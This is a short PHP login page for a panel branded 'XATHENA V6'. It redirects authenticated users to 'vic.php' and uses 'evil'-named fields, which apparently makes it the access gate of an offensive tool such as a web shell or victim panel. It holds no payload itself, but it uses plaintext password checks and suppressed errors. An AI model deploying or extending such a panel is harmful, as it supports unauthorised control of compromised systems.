<?php 
error_reporting(0);
session_start();
include 't0ol.php';
if($_SESSION['user'] != ''){
header('location: vic.php');
}


?>





<html>
<head>
<style>
body{
font-fampily:comic sans ms;}
*{outline:none; outline:0;}
.evpass{border:1px solid red; padding:5px; color:red;}
.evil{padding:5px; cursor:pointer; background:red; color:white; border:1px solid dr;}
</style>
</head>
<body>
<center>
 
 <h2>Copy of XATHENA V6 to <b><?php echo $name; ?> </b>.</h2>
<form action="" method="post">

<input type="password" required name="user_pass" class="evpass" placeholder="Password">
<input type="submit" name="evil" class="evil" value=" login ">
</form> 
<?php 

if(isset($_POST['evil'])){
	$evil = $_POST['user_pass'];
	if($evil == $pass OR $evil == $name){
		$_SESSION['user'] = $evil;
		header("location: vic.php?log=in");
	}
	else{
	echo "<font color='red'> Wrong password</font>";
	}
}

?>
